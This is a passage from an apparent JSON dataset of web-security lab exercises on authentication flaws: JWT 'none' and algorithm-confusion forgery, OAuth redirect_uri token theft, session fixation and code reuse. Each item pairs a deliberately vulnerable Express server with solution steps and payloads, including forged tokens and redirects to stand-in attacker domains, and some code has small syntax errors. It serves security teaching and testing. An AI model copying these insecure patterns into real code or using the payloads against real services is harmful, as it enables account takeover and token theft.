      "Craft a new token manually with 'alg' set to 'none' and payload: { \"username\": \"admin\" }.",
      "Remove the signature section and send the token in the Authorization header.",
      "Send GET /admin-account with forged JWT and verify access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'rootpass' }, { username: 'user', password: 'userpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'supersecret', { algorithm: 'none' }); res.json({ token }); } else { res.status(403).json({ message: 'Invalid credentials' }); } }); app.get('/admin-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token); if (decoded?.username === 'admin') { res.send('Admin panel access granted'); } else { res.status(401).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "JWT with alg: 'none' and payload: { \"username\": \"admin\" }",
      "Base64 encoded header: eyJhbGciOiJub25lIn0=",
      "Base64 encoded payload: eyJ1c2VybmFtZSI6ImFkbWluIn0=",
      "JWT: eyJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIn0=."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect flow",
    "Lab Description": "This OAuth implementation allows redirection to arbitrary URLs after authentication due to missing state parameter validation. The 'redirect_uri' can be manipulated, enabling token theft via phishing. To solve: craft a malicious OAuth URL to intercept Carlos's token and use it to access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start Burp and intercept a login request using OAuth to identify the authorization flow URL and parameters.",
      "Modify the 'redirect_uri' parameter to point to your controlled server (e.g., http://attacker.net/callback).",
      "Send the modified URL to the victim or simulate a redirect using curl/Postman.",
      "Capture the redirected URL with the access token in your server logs.",
      "Use the stolen token in an Authorization header to access /user-profile as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const request = require('request'); const querystring = require('querystring'); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const token = 'token-for-carlos'; res.redirect(`${redirect_uri}?access_token=${token}`); }); app.get('/user-profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-for-carlos') { res.send('Profile of Carlos'); } else { res.status(401).send('Invalid token'); } }); app.listen(5000);",
    "payloads": [
      "GET /auth?redirect_uri=http://attacker.net/callback",
      "Intercepted access_token from attacker.net/callback",
      "Authorization: Bearer token-for-carlos"
    ]
  },
  {
    "Lab scenario": "JWT signature spoof via 'none' algorithm",
    "Lab Description": "This lab implements JSON Web Token (JWT) based authentication using insecure algorithm handling. The server accepts tokens signed using the 'none' algorithm, allowing attackers to forge valid tokens without knowing the secret key. The application verifies the JWT token from the Authorization header and grants access to sensitive resources without verifying the signature when 'alg' is set to 'none'. To solve: Craft a forged JWT for Carlos's account and access his profile page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a request using Burp Suite and inspect the Authorization: Bearer <token> header.",
      "Decode the JWT using jwt.io or Burp Decoder and verify the structure and algorithm.",
      "Create a new JWT header with \"alg\":\"none\" and set the payload to {\"username\":\"carlos\"}. Remove the signature part.",
      "Replace the original token in the Authorization header with the unsigned token and forward the request.",
      "Verify access to Carlos's profile page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', role: 'user' }]; app.get('/profile', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username === 'carlos') return res.send('Sensitive profile data for carlos'); } jwt.verify(token, 'supersecret'); res.send('Valid token'); } catch (err) { res.status(403).send('Invalid token'); } }); const PORT = 3000; app.listen(PORT, () => console.log(JWT None Bypass Lab running on http://localhost:${PORT}));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID",
    "Lab Description": "This lab is vulnerable to session fixation due to predictable session ID issuance. The application assigns session IDs before login and does not regenerate them after successful authentication. The attacker can pre-define a session ID and trick the victim into using it. To solve: Fix a session ID before Carlos logs in and use it to hijack his session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept a request and note the Set-Cookie: session=... value before login.",
      "Send a crafted link to Carlos that contains a known session ID as a cookie value.",
      "Wait until Carlos logs in and reuses the known session ID.",
      "Send a GET /my-account request using the same session ID as the cookie.",
      "Confirm that Carlos’s account page is returned."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: 'securepass' }; const sessions = {}; app.get('/login', (req, res) => { const { username, password } = req.query; if (users[username] && users[username] === password) { const sessionId = req.cookies.session; sessions[sessionId] = username; res.send('Logged in'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.session; const user = sessions[sessionId]; if (user === 'carlos') { res.send('Welcome to carlos's account'); } else { res.status(403).send('Access denied'); } }); const PORT = 3000; app.listen(PORT, () => console.log(Session Fixation Lab running on http://localhost:${PORT}));",
    "payloads": [
      "Cookie: session=known-session-id",
      "GET /login?username=carlos&password=securepass HTTP/1.1",
      "GET /my-account HTTP/1.1 with Cookie: session=known-session-id"
    ]
  },
  {
    "Lab scenario": "OAuth authorization code reuse",
    "Lab Description": "This lab’s OAuth implementation allows reuse of authorization codes, violating the single-use principle. An attacker who intercepts an unused authorization code can reuse it to log in as the victim. The app fails to invalidate codes after the first use. To solve: Capture Carlos's OAuth code and reuse it to gain access to his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp to proxy the OAuth flow and intercept the GET /oauth-callback?code=... request from Carlos.",
      "Save the captured code and allow Carlos’s original request to proceed.",
      "Send a new GET /oauth-callback?code=... request manually using the same code.",
      "Observe that a session is created and the user is authenticated as Carlos.",
      "Navigate to /my-account to verify the hijacked session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const usedCodes = {}; const users = { 'authcode-carlos': 'carlos' }; app.get('/oauth-callback', (req, res) => { const { code } = req.query; if (usedCodes[code]) { return res.status(403).send('Code already used'); } const user = users[code]; if (user) { usedCodes[code] = true; res.cookie('session', user); res.send('Logged in as ' + user); } else { res.status(401).send('Invalid code'); } }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session === 'carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 3000; app.listen(PORT, () => console.log(OAuth Code Reuse Lab running on http://localhost:${PORT}));",
    "payloads": [
      "GET /oauth-callback?code=authcode-carlos HTTP/1.1",
      "Cookie: session=carlos",
      "GET /my-account HTTP/1.1"
    ]
  },
  {
    "Lab scenario": "JWT tampering with none algorithm",
    "Lab Description": "The application uses JSON Web Tokens (JWTs) for session management. However, it accepts tokens signed using the 'none' algorithm without verification. The application decodes the token and grants access based on the embedded user role. To solve: Forge a JWT granting admin privileges and access the /admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept JWT after login using Burp Suite and decode it using jwt.io.",
      "Observe the algorithm is set to 'HS256'. Change it to 'none' and remove the signature.",
      "Modify the payload to {\"username\":\"admin\",\"role\":\"admin\"}.",
      "Encode the modified header and payload without a signature.",
      "Use Postman to send a request with the tampered JWT in the Authorization header and verify access to /admin."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const SECRET = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username, role: 'user' }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.role === 'admin') { res.send('Welcome Admin'); } else { res.status(403).send('Access Denied'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "{\"alg\":\"none\"}.{\"username\":\"admin\",\"role\":\"admin\"}.",
      "Authorization: Bearer <modified_jwt>"
    ]
  },
  {
    "Lab scenario": "Session fixation through predictable session ID",
    "Lab Description": "The application sets session identifiers in the URL as query parameters after login. These session IDs are generated using predictable patterns. An attacker can fix a session ID for the victim and hijack the session post-login. To solve: Pre-set Carlos's session ID, trick him into logging in, then reuse the session to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to crawl and identify that sessionID is passed in the URL (e.g., /dashboard?sessionID=12345).",
      "Send a crafted link with sessionID=abc123 to Carlos via social engineering.",
      "Once Carlos logs in, his session is bound to sessionID=abc123.",
      "Use the same session ID to access /dashboard?sessionID=abc123 from your browser.",
      "Confirm account access and view Carlos’s dashboard page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const users = [{ username: 'carlos', password: 'carlospass' }]; app.get('/login', (req, res) => { const { username, password, sessionID } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[sessionID] = username; res.redirect(`/dashboard?sessionID=${sessionID}`); } else { res.send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { const user = sessions[req.query.sessionID]; if (user) { res.send(`Dashboard for ${user}`); } else { res.status(403).send('Access Denied'); } }); app.listen(3000);",
    "payloads": [
      "/login?username=carlos&password=carlospass&sessionID=abc123",
      "/dashboard?sessionID=abc123",
      "sessionID=predefined_session_id"
    ]
  },
  {
    "Lab scenario": "OAuth redirect_uri manipulation",
    "Lab Description": "This lab uses OAuth for login via a third-party provider. However, the application does not properly validate the redirect_uri parameter, allowing attackers to steal authorization codes. To solve: Intercept a login request and modify the redirect_uri to an attacker-controlled server, then extract the authorization code.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the login flow and capture the OAuth authorization request.",
      "Locate the redirect_uri parameter pointing to /oauth-callback.",
      "Change it to your exploit server (e.g., https://attacker.com/callback) and forward the request.",
      "Receive the OAuth code on your exploit server and replay it to the real app’s /oauth-callback endpoint.",
      "Obtain a session token and use it to access the /my-account endpoint as the victim."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/login', (req, res) => { const redirect_uri = req.query.redirect_uri; const auth_url = `https://oauth.provider/auth?client_id=abc&redirect_uri=${redirect_uri}&response_type=code`; res.redirect(auth_url); }); app.get('/oauth-callback', async (req, res) => { const { code } = req.query; const token = await axios.post('https://oauth.provider/token', { code }); res.cookie('session', token.data.access_token); res.send('Logged in'); }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session) res.send('User Account Data'); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "https://oauth.provider/auth?client_id=abc&redirect_uri=https://attacker.com/callback&response_type=code",
      "POST /oauth-callback?code=stolen-code",
      "session=<access_token_from_stolen_code>"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in Authorization header",
    "Lab Description": "The application's JWT implementation accepts insecure algorithms during token validation. Specifically, it fails to enforce signature verification when the 'alg' field is modified to 'none'. The application trusts any Authorization: Bearer token that decodes to a valid user structure. To solve: craft a forged JWT token with 'none' algorithm and impersonate the user 'carlos' to access their account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a request with a valid JWT after logging in.",
      "2. Decode the JWT using jwt.io or a Python script to observe its structure.",
      "3. Change the 'alg' header to 'none' and modify the payload to {\"username\": \"carlos\"}.",
      "4. Remove the JWT signature entirely and set the token as Authorization: Bearer <forged_token>.",
      "5. Send the modified request using Postman or Burp Repeater and observe access to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = ['carlos', 'admin']; app.get('/account', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Unauthorized'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.username === 'carlos') { res.send('Account page of carlos'); } else { res.status(403).send('Access denied'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Confusion Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{\"alg\": \"none\"} + {\"username\": \"carlos\"}",
      "Authorization: Bearer <unsigned_JWT_with_carlos>"
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation in callback handler",
    "Lab Description": "The OAuth implementation improperly validates the redirect_uri parameter in the authentication flow. An attacker can manipulate the redirect to inject a malicious OAuth token or leak the access_token. To solve: manipulate the OAuth redirect to impersonate a victim user (carlos) and access their profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept the OAuth login flow with Burp Suite or OWASP ZAP.",
      "2. Identify the redirect_uri parameter sent in the initial GET request to /oauth/authorize.",
      "3. Modify the redirect_uri to point to your attacker-controlled domain (e.g., https://attacker.com/callback).",
      "4. Capture the access_token redirected to your server and extract it from the query string.",
      "5. Replay an authenticated request using Postman with the stolen token in the Authorization header to impersonate Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { redirect_uri, client_id } = req.query; if (!client_id || !redirect_uri) return res.status(400).send('Missing parameters'); const token = 'access_token_for_carlos'; res.redirect(`${redirect_uri}?access_token=${token}`); }); app.get('/profile', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer access_token_for_carlos') { res.send('Welcome Carlos'); } else { res.status(401).send('Unauthorized'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`OAuth Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "GET /oauth/authorize?client_id=abc&redirect_uri=https://attacker.com/callback",
      "Captured token: access_token_for_carlos",
      "Authorization: Bearer access_token_for_carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation in Set-Cookie header",
    "Lab Description": "The application assigns session identifiers via a predictable scheme before authentication. It does not regenerate the session ID post-login, allowing attackers to fixate a session ID and later hijack the session once the victim logs in. To solve: pre-assign a session ID, get the victim to log in, and then use the same session ID to access their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman or curl to access the application and receive a Set-Cookie with a session ID.",
      "2. Share the URL with the victim, ensuring the session ID is retained via URL or cookie.",
      "3. Wait for the victim to authenticate using the provided session.",
      "4. Reuse the session ID in a new request using Burp Repeater or curl.",
      "5. Confirm account access by requesting the /account endpoint and solving the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/login', (req, res) => { const sid = req.cookies.sid || `sess-${Date.now()}`; res.cookie('sid', sid); sessions[sid] = { authenticated: false }; res.send('<form method=\"POST\">Login</form>'); }); app.post('/login', (req, res) => { const sid = req.cookies.sid; if (sid && sessions[sid]) { sessions[sid].authenticated = true; res.send('Logged in'); } else { res.send('Error'); } }); app.get('/account', (req, res) => { const sid = req.cookies.sid; if (sid && sessions[sid] && sessions[sid].authenticated) { res.send('Welcome to Carlos account'); } else { res.status(403).send('Forbidden'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: sid=sess-1712345678901",
      "Share link with victim using same session ID",
      "Access account with: Cookie: sid=sess-1712345678901"
    ]
  },
  {
    "Lab scenario": "Session fixation via insecure Set-Cookie handling in login endpoint",
    "Lab Description": "The login process fails to invalidate pre-authentication session cookies. The application sets the session ID before the user logs in, and that same session persists after successful authentication. To solve: Hijack Carlos's session by fixing a known session ID before authentication and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Use Burp Suite to intercept the initial GET /login request and note the Set-Cookie: sessionId value.",
      "2.Send the unauthenticated sessionId to the victim via a malicious link, ensuring Carlos uses it.",
      "3.Once Carlos logs in using the fixed session ID, use the same session ID cookie to authenticate as him.",
      "4.Replay the GET /my-account request with the fixed session ID cookie.",
      "5.Confirm successful account access by verifying Carlos's account data in the response."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'carlospass' }]; const sessions = {}; app.get('/login', (req, res) => { let sid = Math.random().toString(36).substring(2); res.cookie('sessionId', sid); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sessionId] = username; res.send('Logged in'); } else { res.status(403).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionId; if (sessions[sid]) res.send(`Account page for ${sessions[sid]}`); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "Use predefined sessionId in victim's cookie before login",
      "Replay sessionId in attacker's browser after victim logs in"
    ]
  },
  {
    "Lab scenario": "JWT token tampering with symmetric algorithm substitution",
    "Lab Description": "This application uses JWTs for session management but supports algorithm substitution from RS256 to HS256 using a public key as the secret. To solve: Forge a valid JWT token for Carlos and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Burp Suite or Postman to capture the JWT token issued after authentication.",
      "2.Decode the token header and replace \"alg\": \"RS256\" with \"alg\": \"HS256\".",
      "3.Use the server's public key as the HMAC secret key to sign a new JWT with 'username': 'carlos'.",
      "4.Replace the original JWT with your forged token in Authorization: Bearer header.",
      "5.Send a request to GET /my-account and verify access to Carlos's account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const privateKey = fs.readFileSync('./private.pem'); const publicKey = fs.readFileSync('./public.pem'); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, privateKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); res.send(`Account data for ${decoded.username}`); } catch { res.status(403).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\"}",
      "Sign with HMAC using server's public key as secret"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect leading to token theft",
    "Lab Description": "The OAuth redirect_uri is not properly validated, enabling redirection to arbitrary domains. The app leaks the OAuth access token in the URL fragment. To solve: Steal Carlos's access token via a crafted phishing link and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use OWASP ZAP or Burp to observe the OAuth flow and note the redirect_uri parameter.",
      "2.Craft a phishing URL with redirect_uri set to your controlled domain and send it to Carlos.",
      "3.Extract the access_token from the URL fragment once Carlos authenticates.",
      "4.Use the stolen token in an Authorization: Bearer header.",
      "5.Send a GET request to /my-account and verify access to Carlos's data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const token = 'token-for-carlos'; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-for-carlos') res.send('Account data for carlos'); else res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "https://vulnerable-app.com/auth?redirect_uri=https://attacker.com/callback",
      "Use stolen token: Authorization: Bearer token-for-carlos"
    ]
  },
  {
    "Lab scenario": "JWT tampering via algorithm confusion in session token",
    "Lab Description": "This lab's JWT-based session handling is vulnerable to algorithm confusion. The server does not enforce strict verification of the signing algorithm. The application blindly trusts the `alg` field in the token. To solve: Forge a JWT token with algorithm `none` and escalate your privileges to admin to access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the JWT after logging in with a regular user account.",
      "Send the token to Decoder and change the algorithm field in the JWT header from 'HS256' to 'none'.",
      "Remove the signature portion of the token completely.",
      "Modify the payload to include {\"username\":\"admin\"}.",
      "Forward the modified token in an Authorization header and access /admin."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Unauthorized'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.username === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Forbidden'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "{\"alg\":\"none\"}.{\"username\":\"admin\"}."
    ]
  },
  {
    "Lab scenario": "Session fixation via insecure session regeneration",
    "Lab Description": "This lab's session handling mechanism is vulnerable to session fixation. The server does not regenerate session IDs after successful login, allowing an attacker to set the session ID beforehand. To solve: Fix a known session ID, trick the victim into logging in, and access their session to view the My Account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to initiate a session as an attacker and capture the fixed session ID.",
      "Send a phishing link to the victim that includes the session ID as a cookie.",
      "Wait for the victim to log in using the provided session.",
      "Use the same session ID to access their account.",
      "Navigate to /my-account to verify access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true })); const users = { carlos: 'pass123' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.username = username; res.send('Logged in'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.username === 'carlos') { res.send('Carlos account accessed'); } else { res.status(403).send('Forbidden'); } }); const PORT = 4001; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: connect.sid=sess:abcd1234",
      "Phishing link with pre-set cookie: document.cookie = 'connect.sid=sess:abcd1234';"
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation",
    "Lab Description": "This lab simulates a misconfigured OAuth flow that allows redirect URI manipulation. The authorization server does not validate the redirect URI against a whitelist. To solve: Manipulate the redirect URI to intercept an OAuth authorization code and reuse it to log in as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, initiate the OAuth login flow and intercept the authorization request.",
      "Modify the `redirect_uri` parameter to a malicious domain under your control.",
      "Host a listener to capture the authorization code sent by the OAuth server.",
      "Exchange the captured code manually for an access token via Postman.",
      "Use the access token to authenticate as Carlos and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); const redirectMap = {}; app.get('/auth', (req, res) => { const { code, redirect_uri } = req.query; if (!code) { const authURL = `https://oauth.example.com/auth?response_type=code&client_id=client123&redirect_uri=${redirect_uri}`; res.redirect(authURL); } else { redirectMap[code] = redirect_uri; res.send('Code received'); } }); app.get('/callback', async (req, res) => { const { code } = req.query; const redirect_uri = redirectMap[code]; const tokenResponse = await axios.post('https://oauth.example.com/token', { code, redirect_uri }); const accessToken = tokenResponse.data.access_token; if (accessToken === 'carlos-token') { res.send('Welcome Carlos'); } else { res.status(403).send('Invalid token'); } }); const PORT = 4002; app.listen(PORT, () => console.log(`OAuth Redirect Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "https://oauth.example.com/auth?client_id=client123&redirect_uri=https://attacker.com/callback",
      "Authorization: Bearer carlos-token"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Predictable Session ID",
    "Lab Description": "This lab's session management is vulnerable to session fixation. The server accepts session IDs from unauthenticated users and does not regenerate them upon login. The application stores the session ID in a cookie named sid. To solve: hijack Carlos's session and access his account page using a fixed session ID set before login.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture pre-login traffic in Burp Suite and note the sid cookie structure",
      "Send a crafted request with a preset sid and log in as Carlos",
      "Craft a link with the same sid value and send it to Carlos",
      "After Carlos logs in, reuse the fixed sid to hijack the session",
      "Verify access to /my-account to solve the lab"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'supersecret' }]; const sessions = {}; app.get('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sid; sessions[sid] = username; res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sid]; if (username === 'carlos') res.send('Welcome to your account, Carlos'); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "sid=fix123; login as carlos",
      "GET /my-account with Cookie: sid=fix123",
      "Phish Carlos with URL using sid=fix123"
    ]
  },
  {
    "Lab scenario": "JWT tampering due to missing signature validation",
    "Lab Description": "This lab is vulnerable to JWT tampering. The backend decodes JWTs without validating their signatures. JWTs are used for user authentication and passed via Authorization headers. To solve: forge a valid JWT identifying as Carlos and access his profile endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture JWT from your login session using Burp Suite",
      "Decode the JWT using jwt.io and inspect the payload",
      "Modify payload to {\"user\":\"carlos\"} and change alg to none",
      "Remove the signature part and replay token in Authorization header",
      "Send GET /profile and verify access to Carlos's account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'hunter2' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Login failed'); const token = jwt.sign({ user: username }, 'secret', { algorithm: 'HS256' }); res.send({ token }); }); app.get('/profile', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; const decoded = jwt.decode(token); if (decoded.user === 'carlos') return res.send('Carlos profile data'); res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0.",
      "Authorization: Bearer [forged_token]",
      "{\"alg\":\"none\",\"user\":\"carlos\"}"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration: open redirect token theft",
    "Lab Description": "The lab contains an OAuth implementation with an open redirect in the redirect_uri parameter. The application does not validate redirect URIs strictly, enabling attackers to steal OAuth authorization codes. To solve: craft a malicious redirect_uri, capture Carlos's OAuth code, and exchange it for a token to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send OAuth request with redirect_uri pointing to attacker-controlled server",
      "Trick Carlos into visiting the crafted OAuth URL",
      "Capture authorization code from your server logs",
      "Exchange code for access token via legitimate OAuth token endpoint",
      "Use the token to access /api/account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; res.redirect(`${redirectUri}?code=authcode123`); }); app.get('/token', async (req, res) => { const { code } = req.query; if (code === 'authcode123') res.send({ access_token: 'token-carlos' }); else res.status(400).send('Invalid code'); }); app.get('/api/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos') res.send('Carlos account data'); else res.status(403).send('Forbidden'); }); app.listen(5000);",
    "payloads": [
      "https://victim.com/auth?redirect_uri=https://attacker.com/collect",
      "Captured code=authcode123",
      "GET /token?code=authcode123",
      "Authorization: Bearer token-carlos"
    ]
  },
  {
    "Lab scenario": "GraphQL endpoint exposing JWT manipulation vulnerability",
    "Lab Description": "A GraphQL API implements authentication using a stateless JWT stored in the Authorization header. The server does not validate the token signature, allowing attackers to craft arbitrary JWTs to impersonate users. The application accepts unsigned tokens with alg=none and exposes a GraphQL endpoint. To solve: Forge a JWT as carlos and retrieve his user profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to query the /graphql endpoint with a valid JWT to understand token structure",
      "Validate the server ignores signature by crafting a token with alg=none using jwt.io",
      "Edit JWT payload with { \"username\": \"carlos\" } and remove the signature segment",
      "Resend the modified token in Authorization: Bearer header to the GraphQL endpoint",
      "Query { userProfile { email username } } and confirm the username returned is carlos"
    ],
    "Vulnerability name": "Authentication",
